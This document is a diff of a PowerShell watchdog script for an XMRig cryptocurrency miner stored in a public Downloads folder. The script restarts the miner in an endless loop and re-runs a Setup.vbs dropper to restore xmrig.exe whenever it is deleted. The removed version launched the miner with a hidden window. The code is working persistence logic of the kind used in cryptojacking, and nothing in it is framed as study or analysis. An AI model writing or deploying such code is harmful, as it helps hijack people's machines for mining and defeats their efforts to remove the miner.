@@ -1,58 +1,56 @@
 $xmrigPath = "C:\Users\Public\Downloads\xmrig-6.22.2\xmrig.exe"
-$coinRunPath = "C:\Users\Public\Downloads\xmrig-6.22.2\COINRUN.cmd"
 $setupPath = "C:\Users\Public\Downloads\Setup.vbs"
-$xmrigProcessName = "xmrig"
+$coinRunPath = "C:\Users\Public\Downloads\xmrig-6.22.2\COINRUN.cmd"
 
 function Start-CoinRun {
-    $global:coinRunProcess = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$coinRunPath`"" -PassThru -WindowStyle Hidden
-    Write-Host "Started COINRUN.cmd silently."
+    $global:coinRunProcess = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$coinRunPath`"" -PassThru
+    Write-Host "coinrun.cmd START"
 }
 
 if (Test-Path $xmrigPath) {
     Start-CoinRun
 } else {
-    Write-Warning "xmrig.exe not found..."
+    Write-Warning "xmrig.exe DoseNotExist..."
     if (Test-Path $setupPath) {
-        Write-Host "Running Setup.vbs to recover..."
         Start-Process -FilePath "wscript.exe" -ArgumentList "`"$setupPath`""
+        Write-Host "Running Setup.vbs"
+
         while (!(Test-Path $xmrigPath)) {
-            Write-Host "Waiting for xmrig.exe..."
+            Write-Host "Wait xmrig.exe..."
             Start-Sleep -Seconds 3
         }
+
+        Write-Host "xmrig.exe. RUN coinrun.cmd"
         Start-CoinRun
     } else {
-        Write-Error "Setup.vbs not found at $setupPath"
+        Write-Error "NO Setup.vbs"
     }
 }
 
 while ($true) {
     if (!(Test-Path $xmrigPath)) {
-        Write-Warning "xmrig.exe deleted. Trying to recover..."
+        Write-Warning "xmrig.exe Del. Wait..."
 
         if (Test-Path $setupPath) {
             Start-Process -FilePath "wscript.exe" -ArgumentList "`"$setupPath`""
+            Write-Host "Run Setup.vbs!"
+
             while (!(Test-Path $xmrigPath)) {
-                Write-Host "Waiting for xmrig.exe to return..."
+                Write-Host "Wait.. xmrig.exe"
                 Start-Sleep -Seconds 3
             }
+
+            Write-Host "START coinrun.cmd"
             Start-CoinRun
         } else {
-            Write-Error "Setup.vbs not found: $setupPath"
+            Write-Error "NO Setup.vbs: $setupPath"
         }
     }
-
     if ($global:coinRunProcess -and $global:coinRunProcess.HasExited) {
-        Write-Warning "coinrun.cmd exited. Restarting..."
+        Write-Warning "coinrun.cmd STOP. Reboot..."
         Start-CoinRun
+    } elseif ($global:coinRunProcess) {
+        Write-Host "coinrun.cmd running..."
     }
-
-    $xmrigRunning = Get-Process -Name $xmrigProcessName -ErrorAction SilentlyContinue
-    if (-not $xmrigRunning) {
-        Write-Warning "xmrig.exe stopped. Restarting coinrun.cmd..."
-        Start-CoinRun
-    } else {
-        Write-Host "xmrig.exe is running."
-    }
-
     Start-Sleep -Seconds 3
 }
